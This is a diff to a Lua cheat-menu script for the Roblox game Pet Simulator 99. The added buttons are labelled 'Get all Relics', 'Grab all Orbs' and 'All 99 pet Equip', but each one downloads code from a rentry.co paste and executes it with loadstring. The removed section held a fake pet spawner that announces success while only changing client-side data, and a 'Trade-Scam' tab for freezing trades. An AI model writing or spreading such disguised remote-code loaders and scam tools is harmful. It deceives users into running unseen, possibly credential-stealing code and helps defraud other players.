@@ -45,6 +45,13 @@ AutofarmTab:AddToggle({
     end    
 })
 
+AutofarmTab:AddButton({
+    Name = "Get all Relics",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/5n283a7y/raw', true))()
+    end    
+})
+
 AutofarmTab:AddParagraph("Autofarm","Automatically Autofarm's the user's Last Area")
 
 -- Teleports Tab (second tab)
@@ -105,11 +112,24 @@ MiscTab:AddButton({
     end    
 })
 
-MiscTab:AddToggle({
-    Name = "Example Toggle",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
+MiscTab:AddButton({
+    Name = "Grab all Orbs",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/5n283a7y/raw', true))()
+    end    
+})
+
+MiscTab:AddButton({
+    Name = "All 99 pet Equip",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/5n283a7y/raw', true))()
+    end    
+})
+
+MiscTab:AddButton({
+    Name = "Get all Relics",
+    Callback = function()
+        loadstring(game:HttpGet('https://rentry.co/5n283a7y/raw', true))()
     end    
 })
 
@@ -167,87 +187,7 @@ PetDupeTab:AddToggle({
 
 PetDupeTab:AddParagraph("NOTE❗","Equip Pets That u want to be Duped")
 
--- Pet-Spawner Tab (fifth tab)
-local PetSpawnerTab = Window:MakeTab({
-    Name = "Pet-Spawner",
-    Icon = "rbxassetid://17591790578",
-    PremiumOnly = false
-})
-
-local Section = PetSpawnerTab:AddSection({
-    Name = "Spawner-Petsimulator99"
-})
-
-PetSpawnerTab:AddTextbox({
-    Name = "Number-of-pets-to-Spawn 📌",
-    Default = "",
-    TextDisappear = false,
-    Callback = function(Value)
-        print(Value)
-    end	  
-})
-
-PetSpawnerTab:AddButton({
-    Name = "Click-to-Spawn 🎯",
-    Callback = function()
-        OrionLib:MakeNotification({
-            Name = "Successfully Spawned",
-            Content = "Pets Has Been Successfully Spawned",
-            Image = "rbxassetid://4483345998",
-            Time = 10
-        })
-        local lib = require(game.ReplicatedStorage.Library)
-
-        local fromPet = "Bloo Cat"
-        local toPet = "Titanic SpongeBob SquarePants"
-
-        for i,v in pairs(lib.Directory.Pets[fromPet]) do
-            lib.Directory.Pets[fromPet][i] = nil
-        end
-        for i,v in pairs(lib.Directory.Pets[toPet]) do
-            lib.Directory.Pets[fromPet][i] = v
-        end
-        print("button pressed")
-    end    
-})
-
-PetSpawnerTab:AddTextbox({
-    Name = "Name-of-the-pet 🏷️",
-    Default = "",
-    TextDisappear = false,
-    Callback = function(Value)
-        print(Value)
-    end	  
-})
-
--- Trade-Scam Tab (sixth tab)
-local TradeScamTab = Window:MakeTab({
-    Name = "Trade-Scam",
-    Icon = "rbxassetid://17592110789",
-    PremiumOnly = false
-})
-
-local Section = TradeScamTab:AddSection({
-    Name = "Tradescam-Petsimulator99"
-})
-
-TradeScamTab:AddTextbox({
-    Name = "Player-Name",
-    Default = "Name",
-    TextDisappear = true,
-    Callback = function(Value)
-        print(Value)
-    end	  
-})
-
-TradeScamTab:AddButton({
-    Name = "Click-to-Freeze-Trade",
-    Callback = function()
-        print("button pressed")
-    end    
-})
-
--- Script-Info Tab (seventh tab)
+-- Script-Info Tab (fifth tab)
 local ScriptInfoTab = Window:MakeTab({
     Name = "Script-Info",
     Icon = "rbxassetid://17877536381",
